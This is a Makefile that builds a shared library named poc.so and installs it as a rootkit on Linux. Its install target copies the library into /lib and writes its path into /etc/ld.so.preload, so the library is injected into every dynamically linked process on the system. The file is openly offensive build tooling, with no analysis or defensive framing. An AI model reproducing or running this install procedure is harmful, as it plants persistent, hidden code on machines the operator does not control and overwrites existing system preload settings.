CFLAGS+= -Wall -g
LDFLAGS+= -lc -ldl -lutil
INSTALLDIR=/lib

all: config poc.so

config:
	@python3 config.py > const.h

poc.so: poc.c xor.c
	gcc -fPIC -g -c poc.c xor.c
	gcc -fPIC -shared -Wl,-soname,poc.so poc.o xor.o $(LDFLAGS) -o poc.so

install: all
	@echo [-] Checking the installation dir $(INSTALLDIR)
	@test -d $(INSTALLDIR) || mkdir $(INSTALLDIR)
	@echo [-] Installing rootkit
	@install -m 0755 poc.so $(INSTALLDIR)/
	@echo [-] Loading rootkit
	@echo $(INSTALLDIR)/poc.so > /etc/ld.so.preload
	@echo [-] Done

clean:
	rm poc.so *.o

